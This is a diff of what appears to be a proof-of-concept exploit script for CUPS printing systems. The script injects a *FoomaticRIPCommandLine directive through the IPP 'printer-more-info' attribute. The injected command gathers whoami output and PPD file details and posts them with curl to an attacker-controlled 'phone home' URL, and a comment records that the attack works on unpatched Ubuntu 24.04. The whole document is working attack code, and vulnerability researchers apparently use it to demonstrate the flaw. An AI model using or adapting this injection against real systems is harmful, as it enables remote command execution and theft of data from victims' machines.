@@ -31,18 +31,12 @@ def malicious_attributes():
     malicious_cmd = f"(whoami && echo ' ||| ' && wc /etc/cups/ppd/{attacker_printer_name}.ppd && echo ' ||| ' && ls -al /etc/cups/ppd) 2>&1 | curl -X POST {attacker_phone_home} -d @-"
     malicious_cmd_bytes = bytes('"' + malicious_cmd + '"', encoding="utf-8")  # wrap in "..."
 
-    # weird...
-    #  printer-privacy-policy-uri (valid) works on victim, but printer-more-info (invalid) doesn't
-    #    TODO test injected
-    #  opposite is true on host! (printer-more-info works, printer-privacy-policy-uri doesn't)
-
-    # TODO try with rolled back 2.0.0-0ubuntu10 package
+    # FYI printer-more-info => *APSupplies: "https://www.google.com/"
+    # FYI printer-privacy-policy-uri => IIRC CupsPrivacyUri/Policy
+    # on ubuntu24.04 w/o security patches both printer-more-info and printer-privacy-policy-uri WORK
 
     return {
-        # (SectionEnum.printer, b'printer-privacy-policy-uri', TagEnum.uri): [
-        #     b"https://www.google.com"
-        # ]  # *** failing on victim-vm
-        (SectionEnum.printer, b'printer-privacy-policy-uri', TagEnum.uri): [
+        (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
             # FYI first and final " are added by string format
             b"""https://www.google.com/"
 *FoomaticRIPCommandLine: """ + malicious_cmd_bytes + b"""
